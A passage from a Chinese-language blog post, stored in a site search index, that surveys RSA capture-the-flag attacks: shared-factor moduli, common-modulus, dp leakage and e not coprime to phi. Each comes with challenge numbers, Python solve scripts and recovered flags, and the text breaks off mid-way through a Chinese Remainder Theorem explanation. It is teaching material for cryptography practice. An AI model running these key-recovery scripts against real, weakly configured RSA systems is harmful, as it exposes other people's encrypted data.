<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RSA题目常见分析</title>
      <link href="/2022/09/26/RSA_Ex/"/>
      <url>/2022/09/26/RSA_Ex/</url>
      
        <content type="html"><![CDATA[<p>最近驹宝给我塞了很多RSA的题，自己也做了很多，学下点 RSA 算法的精髓，写一篇总结，后续持续在这里更新。</p><span id="more"></span><h2 id="RSA的介绍"><a href="#RSA的介绍" class="headerlink" title="RSA的介绍"></a>RSA的介绍</h2><p>RSA的介绍见我<a href="https://xia0ji233.pro/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">这篇博客</a></p><h2 id="RSA常用做法分析"><a href="#RSA常用做法分析" class="headerlink" title="RSA常用做法分析"></a>RSA常用做法分析</h2><h3 id="低指数攻击"><a href="#低指数攻击" class="headerlink" title="低指数攻击"></a>低指数攻击</h3><p>我们知道，RSA的安全在于取模运算的不可逆特性，如果说我的信息本来就是 2，你的加密指数为 2，那么平方下来也就是个 4，取模之后就是取了个寂寞，根据所给公钥和密文，我们直接开个方就得到了明文。</p><h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><p>如果两个公钥模不互素，含有公约数的话，我们用辗转相除法可以很快分解出 p 和 q，而辗转相除法的时间复杂度不会超过 O(log2N)，这优秀的复杂度也让我们能很快地分解得到两个质数。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">28170992834270720831179261369471274598997702487696049830156332106869494605756009553416359364123120058506393684721611134396175255085248520813138288550002318384024725495758952465143175548462425605668727426820108069752293438648949444194603512285742873214792072294105948293367708158997811248728037063455817833123285203002351350137897355454137123787850275750591595704048821577823564124943498574623818380616182913536791603277118981723293551366839681774271977694827633752127448663006058876017157727926930195199823324400467529841773190345386219832514302786638128439120112894598351249563655852372309078552091992786038041766277</span></span><br><span class="line">n2=<span class="number">30426052411541162629650340351029618556957464479756072258366284852617100608440692462790708527260160603801880998062586095228968453145338155923161883183976907495994708490254171467816217449157828401468749415010271748760024562712415222883445840692381712769800218961961965983057269763458953887162943884366520363358693455535663411308843107559177367470269889790117080885165058052596106490369729956697643818346630535515535267060826393590576457246653806670129899406037697985668889417354391424342725773231355312621066562784839302709229489550567684239158552675013440867386238425395428315796266930676815788000373750994287793821091</span></span><br><span class="line">c1=<span class="number">2582291333174688473482837371310695558013344522219801451176882867544382844570171875599043056723912248821021128705894777239584884707037606324176075924881206372661647696306877429822668287235786023020814823874667156587819928274230054865962630859689154098113218782923808109545553391020429182265395418495962822105988502721180599540017512038621869581406476916453238250489026172610106413861344378397008077526294299119321017408325053654182442842084345081920983250459754887618685974033809325906564138957727999316089837005460571267003092757134432108859653429713579692972626913060573924381433177244348871427046105683280661716738</span></span><br><span class="line">c2=<span class="number">9479980959348294048040415043005053472430206540648250182203975873154652511903511233814860462809419869817942169405620776050389695639672610182559325440498062679122369415235835023694654421107733717733775846408272826799042552945154258022884833151833319678933958340634903581390433575987867437793326943284375631246178387198398978881023408777618571874239336944658161598413171690119933787696662425323587221393547627048996325679636765500603814636055989176181848082280852597546562839789752131657822041737796527736673507903567282808259265596977598085942774362863079389090752606097401982926590840320148439167865891839785863650767</span></span><br><span class="line">e=<span class="number">65537</span></span><br></pre></td></tr></table></figure><p>这里我们 GCD 大可不必自己写，直接用 Crypto 库的 GCD 函数即可，安装方法也在上一篇博客。</p><h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">c,p,q,e</span>):</span></span><br><span class="line">    n=p*q</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d=inverse(e,phi)</span><br><span class="line">    m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m).decode()</span><br><span class="line">n1=<span class="number">28170992834270720831179261369471274598997702487696049830156332106869494605756009553416359364123120058506393684721611134396175255085248520813138288550002318384024725495758952465143175548462425605668727426820108069752293438648949444194603512285742873214792072294105948293367708158997811248728037063455817833123285203002351350137897355454137123787850275750591595704048821577823564124943498574623818380616182913536791603277118981723293551366839681774271977694827633752127448663006058876017157727926930195199823324400467529841773190345386219832514302786638128439120112894598351249563655852372309078552091992786038041766277</span></span><br><span class="line">n2=<span class="number">30426052411541162629650340351029618556957464479756072258366284852617100608440692462790708527260160603801880998062586095228968453145338155923161883183976907495994708490254171467816217449157828401468749415010271748760024562712415222883445840692381712769800218961961965983057269763458953887162943884366520363358693455535663411308843107559177367470269889790117080885165058052596106490369729956697643818346630535515535267060826393590576457246653806670129899406037697985668889417354391424342725773231355312621066562784839302709229489550567684239158552675013440867386238425395428315796266930676815788000373750994287793821091</span></span><br><span class="line">c1=<span class="number">2582291333174688473482837371310695558013344522219801451176882867544382844570171875599043056723912248821021128705894777239584884707037606324176075924881206372661647696306877429822668287235786023020814823874667156587819928274230054865962630859689154098113218782923808109545553391020429182265395418495962822105988502721180599540017512038621869581406476916453238250489026172610106413861344378397008077526294299119321017408325053654182442842084345081920983250459754887618685974033809325906564138957727999316089837005460571267003092757134432108859653429713579692972626913060573924381433177244348871427046105683280661716738</span></span><br><span class="line">c2=<span class="number">9479980959348294048040415043005053472430206540648250182203975873154652511903511233814860462809419869817942169405620776050389695639672610182559325440498062679122369415235835023694654421107733717733775846408272826799042552945154258022884833151833319678933958340634903581390433575987867437793326943284375631246178387198398978881023408777618571874239336944658161598413171690119933787696662425323587221393547627048996325679636765500603814636055989176181848082280852597546562839789752131657822041737796527736673507903567282808259265596977598085942774362863079389090752606097401982926590840320148439167865891839785863650767</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=GCD(n1,n2)</span><br><span class="line">q1=<span class="built_in">int</span>(n1//p)</span><br><span class="line">q2=<span class="built_in">int</span>(n2//p)</span><br><span class="line"><span class="built_in">print</span>(solve(c1,p,q1,e)+solve(c2,p,q2,e))</span><br><span class="line"><span class="comment">#flag&#123;79a0ad16-d357-49af-81e9-d33dc3e541a2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>当一个明文信息在两个不同的指数对同一模数进行了加密之后，我们可以在不求出私钥的情况下计算得到明文信息。</p><p>假设有两个密钥</p><p>$key_1=&lt;e_1,n&gt;$</p><p>$key_2=&lt;e_2,n&gt;$</p><p>明文为 m，我们用这两个公钥分别加密出两串密文。</p><p>$c_1=m^{e_1}%n$</p><p>$c_2=m^{e_2}%n$</p><p>这里需要用到点高数知识。对于整数 $k_1,k_2$，使得方程 $k_1x+k_2y=b$ 存在整数解的前提是 b 能整除 $k_1$ 和 $k_2$ 的最小公约数，也就是 $\gcd(k_1,k_2)$。</p><p>特殊地，对于 b=1，存在整数解的充要条件则是 $k_1$ 与 $k_2$ 互质。</p><p>一般情况下，RSA 的加密指数我们会取质数，所以很容易有 $e_1x+e_2y=1$ 存在一对整数解 (x,y)。</p><p>那么</p><p>$c_1^{x}\times c_2^{y}%n=(m^{xe_1}\times m^{ye_2})%n=m^{xe_1+ye_2}%n$</p><p>最后化简即得到明文 m。</p><p>我们的目标就是找到一对整数解，对于这个问题，我们可以使用扩展欧几里得算法去计算，或者是使用 Z3 去求解。</p><p>但是我们也很容易能看出，这个整数解应该会是一正一负的，对于负数我们需要做点特殊处理。</p><p>其实比较简单，负数指数我们并不好处理，因为在乘法模的群当中，数集为整数，负指数表示了分数，显然不满足群的封闭性，其实这里处理的方法与我们之前逆元的处理方法一样。</p><p>举个栗子：假设 x&gt;0,y&lt;0，则 $x^y$ 它的逆元为多少，假设不在模乘法代数而是在普通乘法代数，数集被扩展到了实数集，那我们脱口而出肯定是 $x^{-y}$。那么其实，在模乘法体系中，$x^y$ 的逆元一样是 $x^{-y}$，但是它不好被辨别，于是我们再去找到它逆元的逆元，一个数的逆元的逆元一定是自身。</p><p>我们直接找到 $x$ 在模乘法意义下的逆元 $x^{-1}$ 之后再保持指数不变即是它的逆元，我们可以证明一下：</p><p>$x^{y}\times (x^{-1})^y%n=(x\times x^{-1})^y%n=1$</p><p>因此对于负指数，我们直接符号变正，底数变为逆元即可。</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br></pre></td></tr></table></figure><h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x=egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line">s=egcd(e1, e2)</span><br><span class="line">x=s[<span class="number">1</span>]</span><br><span class="line">y=s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> x&lt;<span class="number">0</span>:</span><br><span class="line">    x=-x</span><br><span class="line">    c1=inverse(c1,n)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    y=-y</span><br><span class="line">    c2=inverse(c2,n)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment">#flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;</span></span><br></pre></td></tr></table></figure><h3 id="数学推导"><a href="#数学推导" class="headerlink" title="数学推导"></a>数学推导</h3><p>这是一类比较泛的题目，题目除了给出密文和公钥以外，还会额外给出一些表达式信息，帮助破解 RSA 的密文，只要理解了 RSA，熟悉 RSA 的推导过程就不会有太大问题。</p><h4 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">14113714305072797946493506481186688069348068525719522300918296843166886149586712593527278499546480608243022456418279126062291885234984378509284469719982424691272187376834036952743111743737743509787289516031073996690244502575328189110938473272385195987277353305316883743349963569552297946004952533211450648686747906145487061115730661553947322806175740991677666279314224690585522184085274523080051179955809948156424572176333474623245604759865579902860320192130044881910837668330885305900309636233281430338678478325361905450208233862057975227437570700376032367636653508625619621365742913511560163593564542385538976273511</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8618327949649600151577805769536868884186050491362368463626647780332443491577028760576306554954308943953267510827791879308004801627303605775129313660121772370222619585966214292305860970821159935577290407908606708688407395127864609535430976332421315463289482130097266383749917829831497635736596409478627650432841064479081322546224912505920515470753069832953929215867402615727986720952496172221103420158414576649301068869241456517428304569955008818909581293445988877086661570321362965360400214418049394686624646829322189252357911547541529314699149144426085781464325489219068048330497460674000186446200265603018557000483</span></span><br><span class="line">dp=<span class="number">22254124501058125233734227965547943196721474032074981803310625346887468776340246924403662046504410526020245040082211662134244900364674425023930821673400316961211254098599523105818306877684796612309587274228054352459332784217520606687007798656236622150535124212386499498298989015161102829904127676310132589861</span></span><br><span class="line">dp=d % (p -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这个题目中，它给了我们 d % (p-1) 的值 dp。</p><p>首先我们联立一下方程组</p><p>$e\times d%(p-1)(q-1)=1$ </p><p>$d%(p-1)=dp$</p><p>根据①式我们可以推出</p><p>$e\times d=k(p-1)(q-1)+1$</p><p>我们在②式左右同乘一个 e。</p><p>$e\times d%(p-1)=dp\times e%(p-1)$</p><p>从左边不难看出，结果应当=1，于是得到等式</p><p>$dp\times e%(p-1)=1$</p><p>首先不难得到 $dp&lt;p$ 则 $dp\times e&lt;p\times e$。</p><p>$dp\times e=k(p-1)+1$</p><p>图中只有 k 与 p 未知，但是我们应当明白 k 不会超过 e。</p><p>于是我们可以将 $dp\times e -1$ 对 $k(k\le e)$ 进行取模判断，若取模结果为零则有可能是这个结果。</p><p>那么我们跑个脚本循环 $[2,65537]$ 即可。</p><h4 id="解题脚本-2"><a href="#解题脚本-2" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">14113714305072797946493506481186688069348068525719522300918296843166886149586712593527278499546480608243022456418279126062291885234984378509284469719982424691272187376834036952743111743737743509787289516031073996690244502575328189110938473272385195987277353305316883743349963569552297946004952533211450648686747906145487061115730661553947322806175740991677666279314224690585522184085274523080051179955809948156424572176333474623245604759865579902860320192130044881910837668330885305900309636233281430338678478325361905450208233862057975227437570700376032367636653508625619621365742913511560163593564542385538976273511</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8618327949649600151577805769536868884186050491362368463626647780332443491577028760576306554954308943953267510827791879308004801627303605775129313660121772370222619585966214292305860970821159935577290407908606708688407395127864609535430976332421315463289482130097266383749917829831497635736596409478627650432841064479081322546224912505920515470753069832953929215867402615727986720952496172221103420158414576649301068869241456517428304569955008818909581293445988877086661570321362965360400214418049394686624646829322189252357911547541529314699149144426085781464325489219068048330497460674000186446200265603018557000483</span></span><br><span class="line">dp=<span class="number">22254124501058125233734227965547943196721474032074981803310625346887468776340246924403662046504410526020245040082211662134244900364674425023930821673400316961211254098599523105818306877684796612309587274228054352459332784217520606687007798656236622150535124212386499498298989015161102829904127676310132589861</span></span><br><span class="line"><span class="comment">#dp=d % (p -1)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime((dp*e-<span class="number">1</span>)//i+<span class="number">1</span>):</span><br><span class="line">            p=(dp*e-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">            q=n//p</span><br><span class="line">            phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d=inverse(e,phi)</span><br><span class="line">            m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment">#flag&#123;0cd82bfc-5544-43c5-b48c-ce11136bea49&#125;</span></span><br></pre></td></tr></table></figure><h3 id="e-phi不互素"><a href="#e-phi不互素" class="headerlink" title="e phi不互素"></a>e phi不互素</h3><p>我们知道 RSA 的加密指数一般为质数，若不是质数会发生什么？</p><p>我们前面推导过 RSA 的计算过程，若 e 不是质数会导致可能求不出 phi 的逆元，或者说找不到一个这样的数 d，使得 $e\times d %\phi=1$，如果 $\gcd(e,\phi)=k$ 则 $e\times d%\phi$ 的结果至少为 k 的整倍数。</p><p>我们按照 RSA 的解密方法最后推导出来的结果也就是</p><p>$m^{k}%n$</p><p>因此我们就回到了怎么解这个指数的问题，若指数 k 小可以直接开方，或者是动用一下低指数攻击。</p><h4 id="例题1-1"><a href="#例题1-1" class="headerlink" title="例题1"></a>例题1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">136959726431205865477775151957746058501964084915586200859223998224419328617512480807779057493884259671732817083158742688893426777301273633213099180123980988559064240005229990903986655711210993445188959348127903344696563428112042019089659624505185444899365837872965591393711833751140798071913532034918073969303</span></span><br><span class="line">q=<span class="number">100775514992570031279080353204884456896540523509595089891057558352540088307146118253575941345444101592071454319892938692060454946607143974473707141313645549356430599711832162076318618985329980795933151213484006411944383963148067340413103907427302327136609462283013833061184517264215353793537565873817217882871</span></span><br><span class="line">e=<span class="number">618</span></span><br><span class="line">c=<span class="number">11474180598339059739824064616811901863008672847264841633401805944654527375502760803872877763162433116575938389089158136355223441822920717752520632181250987580240513955742874287005589873425759901749449152080440281411772036003528325772394140583924413056042024007990830484221229380940124523505145729796879325683192331242784866357454098755097887413530621128405967607900565276243646588213591552811550038972567938749944372033373196416854332876524071485674100971839799288548733601138685897794138343613068716766810753454049042387074495749784721897884348181557610094355833915443696680454373648737843918284068627924128987496538</span></span><br></pre></td></tr></table></figure><p>题目中给出了 $p,q$，我们就照例求一下私钥，但是注意到 $e$ 并非一个质数，所以我们先看看有没有公约数，可以发现有公约数 6。但是这里需要注意，在 <strong>Crypto.Util.number</strong> 中的 inverse 函数，如果有公约数，则会自动帮你除公约数之后的逆元，而 gmpy2 的 invert 函数则会直接报错。</p><h4 id="解题脚本-3"><a href="#解题脚本-3" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">136959726431205865477775151957746058501964084915586200859223998224419328617512480807779057493884259671732817083158742688893426777301273633213099180123980988559064240005229990903986655711210993445188959348127903344696563428112042019089659624505185444899365837872965591393711833751140798071913532034918073969303</span></span><br><span class="line">q=<span class="number">100775514992570031279080353204884456896540523509595089891057558352540088307146118253575941345444101592071454319892938692060454946607143974473707141313645549356430599711832162076318618985329980795933151213484006411944383963148067340413103907427302327136609462283013833061184517264215353793537565873817217882871</span></span><br><span class="line">e=<span class="number">618</span></span><br><span class="line">c=<span class="number">11474180598339059739824064616811901863008672847264841633401805944654527375502760803872877763162433116575938389089158136355223441822920717752520632181250987580240513955742874287005589873425759901749449152080440281411772036003528325772394140583924413056042024007990830484221229380940124523505145729796879325683192331242784866357454098755097887413530621128405967607900565276243646588213591552811550038972567938749944372033373196416854332876524071485674100971839799288548733601138685897794138343613068716766810753454049042387074495749784721897884348181557610094355833915443696680454373648737843918284068627924128987496538</span></span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line">s=gmpy2.iroot(m,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s[<span class="number">0</span>])).decode())</span><br><span class="line"><span class="comment">#flag&#123;d8600272-fa37-4f2d-92e4-2b74bf3adf71&#125;</span></span><br></pre></td></tr></table></figure><p>在这里需要使用 gmpy2 的 iroot 函数，直接进行开 6 次方的操作。</p><h4 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e1=<span class="number">14606334023791426</span></span><br><span class="line">p1=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1=<span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1=<span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line">n1=p1 * q1</span><br><span class="line">e2=<span class="number">13813369129257838</span></span><br><span class="line">p2=<span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2=<span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2=<span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line">n2=p2 * q2</span><br></pre></td></tr></table></figure><p>这题略微有点难，因为需要用到新的数学知识了。</p><p>首先可以看到有 $c_1,c_2$，并且两个公钥由公因数 p。我们任意使用其中一个加密体系都发现 e 与 $\phi$ 不互素，并且有公约数 14，这题就不能像之前那么故技重施了，因为 14 这个指数虽然小但是也不小，直接开是开不了的，但是我们可以转换密钥体系。</p><p>根据之前的一些理论我们可以得出以下式子</p><p>$res_1=m^{14}%n_1=c_1^{d_1}%n_1$</p><p>$res_2=m^{14}%n_2=c_2^{d_2}%n_2$</p><p>我们在其中分解 p 和 q 可以得到三个式子。</p><p>$res_1%p=m^{14}%p$</p><p>$res_1%q_1=m^{14}%q_1$</p><p>$res_2%q_2=m^{14}%q_2$</p><p>对于这三个等式，我们可以使用中国剩余定理求出满足这三个方程的数 。</p><h4 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>中国剩余定理 (Chinese Remainder Theorem, CRT) 可求解如下形式的一元线性同余方程组（其中 $n_1, n_2, \cdots, n_k$ 两两互质）：</p><p>$$<br>\begin{cases}<br>x &amp;\equiv a_1 \pmod {n_1} \<br>x &amp;\equiv a_2 \pmod {n_2} \<br>  &amp;\vdots \<br>x &amp;\equiv a_k \pmod {n_k} \<br>\end{cases}<br>$$</p><p>上面的「物不知数」问题就是一元线性同余方程组的一个实例。</p><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><ol><li>计算所有模数的积 $n$；</li><li>对于第 $i$ 个方程：<ol><li>计算 $m_i=\frac{n}{n_i}$；</li><li>计算 $m_i$ 在模 $n_i$ 意义下的 逆元  $m_i^{-1}$；</li><li>计算 $c_i=m_im_i^{-1}$（<strong>不要对 $n_i$ 取模</strong>）。</li></ol></li><li>方程组在模 $n$ 意义下的唯一解为：$x=\sum_{i=1}^k a_ic_i \pmod n$。</li></ol><h5 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h5><p>我们需要证明上面算法计算所得的 $x$ 对于任意 $i=1,2,\cdots,k$ 满足 $x\equiv a_i \pmod {n_i}$。</p><p>当 $i\neq j$ 时，有 $m_j \equiv 0 \pmod {n_i}$，故 $c_j \equiv m_j \equiv 0 \pmod {n_i}$。又有 $c_i \equiv m_i \cdot (m_i^{-1} \bmod {n_i}) \equiv 1 \pmod {n_i}$，所以我们有：</p><p>$$<br>\begin{aligned}<br>x&amp;\equiv \sum_{j=1}^k a_jc_j                      &amp;\pmod {n_i} \<br> &amp;\equiv a_ic_i                                   &amp;\pmod {n_i} \<br> &amp;\equiv a_i \cdot m_i \cdot (m^{-1}_i \bmod n_i) &amp;\pmod {n_i} \<br> &amp;\equiv a_i                                      &amp;\pmod {n_i}<br>\end{aligned}<br>$$</p><p><strong>即对于任意 $i=1,2,\cdots,k$，上面算法得到的 $x$ 总是满足 $x\equiv a_i \pmod{n_i}$，即证明了解同余方程组的算法的正确性。</strong></p><p>因为我们没有对输入的 $a_i$ 作特殊限制，所以任何一组输入 ${a_i}$ 都对应一个解 $x$。</p><p>另外，若 $x\neq 